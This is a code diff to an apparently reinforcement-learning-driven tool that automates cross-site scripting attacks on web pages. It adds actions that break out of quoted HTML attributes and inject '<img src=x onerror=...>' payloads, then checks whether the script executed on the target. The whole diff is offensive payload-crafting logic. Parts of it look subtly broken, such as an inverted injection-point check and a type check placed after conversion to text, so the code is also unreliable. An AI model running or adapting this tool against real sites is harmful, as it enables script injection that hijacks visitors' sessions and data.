@@ -57,7 +57,9 @@ class Enviroment:
             },
             self.states_name_to_location["findValidHtml"]:{
                 0: self.actionInjectionInText,
-                1: self.actionInjectionInAttribute
+                1: self.actionInjectionInAttribute,
+                2: self.actionInjectionInAttributeSingleQuote,
+                3: self.actionInjectionInAttributeDoubleQuotes
             },
             self.states_name_to_location["avoidHtmlFilters"]:{
                 0: self.actionNewHtmlPayload,
@@ -133,6 +135,7 @@ class Enviroment:
     # Only connect if the html is syntactically valid
     def connectionIfHtmlValid(self, response):
         print("Local test: {}".format(response))
+        #TODO improve syntactically check
         if len(re.findall("<([^<>]*)>([^<>]*<img src=x onerror={}>[^<>]*)<([^<>]*)>",response)) > 0:
             return self.connection(self.xssExploit.payload())
         else:
@@ -146,14 +149,19 @@ class Enviroment:
 
     # Returns the tag into where the random string was injected
     def getInjectionPoint(self, response):
+        #print("[DEBUG] {} -> {}".format(self.xssExploit.expected(), response))
         soup = BeautifulSoup(response,features="lxml")
         for elem in soup(text=re.compile(self.xssExploit.expected())):
-            self.injection_point = str(elem.parent).lower().replace(self.xssExploit.expected().lower(), "{}")
-            break
+            injection_point = str(elem.parent).lower().replace(self.xssExploit.expected().lower(), "{}")
+            if self.injection_point != "":
+                self.injection_point = injection_point
+                break
+        if self.injection_point == "":
+            self.injection_point = response.lower().replace(self.xssExploit.expected().lower(), "{}")
 
     # Execute action and return reward
     def doAction(self, state, action):
-        print("\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
+        print("\n[DEGUG]\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
         
         self.actions[state][action]()
 
@@ -169,15 +177,20 @@ class Enviroment:
     # Checks if an XSS has been triggered
     def goalCheck(self, state, response):
 
-        # Handling exception
-        if type(response) != requests.models.Response:
-            print("{} error: {}".format(response["type"],response["msg"]))
-            sys.exit(1)
-
         expected = self.xssExploit.expected()
+
+        # Handling exception
         if response:
             response = response.text
-            print("Expected: {}\nResponce> {}".format(expected.lower(), response.lower()))
+            print("Expected: {}\nResponce: {}".format(expected.lower(), response.lower()))
+            if type(response) != requests.models.Response:
+                if type(response) == str:
+                    if response == "":
+                        print("[!] error: null response")
+                        sys.exit(1)
+                else:
+                    print("[!] {} error: {}".format(response["type"],response["msg"]))
+                    sys.exit(1)
         else: 
             print("Local test: not valid HTML")
         
@@ -311,13 +324,49 @@ class Enviroment:
         # Find open tag
         tag = re.findall("<(\w*)",self.injection_point)
         if len(tag) > 0:
+            print("TAG: {}".format(tag[0]))
             tag = tag[0]
         else:
             tag = "p"
         
         # Set html padding
-        padding_sx = "\">"
-        padding_dx = "< {} ".format(tag)
+        padding_sx = "1>"
+        padding_dx = "<\\{}><{} ".format(tag,tag)
+        self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
+        
+        # Set default html payload
+        htmlPayload = "<img src=x onerror={}>"
+        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
+
+    def actionInjectionInAttributeSingleQuote(self):
+        # Find open tag
+        tag = re.findall("<(\w*)",self.injection_point)
+        if len(tag) > 0:
+            tag = tag[0]
+        else:
+            tag = "p"
+        
+        # Set html padding
+        padding_sx = "1'>"
+        padding_dx = "<{} ".format(tag)
+        self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
+        
+        # Set default html payload
+        htmlPayload = "<img src=x onerror={}>"
+        self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
+
+    def actionInjectionInAttributeDoubleQuotes(self):
+        # Find open tag
+        tag = re.findall("<(\w*)",self.injection_point)
+        if len(tag) > 0:
+            print("TAG: {}".format(tag[0]))
+            tag = tag[0]
+        else:
+            tag = "p"
+        
+        # Set html padding
+        padding_sx = "1\">"
+        padding_dx = "<\\{}><{} ".format(tag,tag)
         self.xssExploit.setHtmlSyntaxPaddings(padding_sx,padding_dx,padding_sx,padding_dx)
         
         # Set default html payload
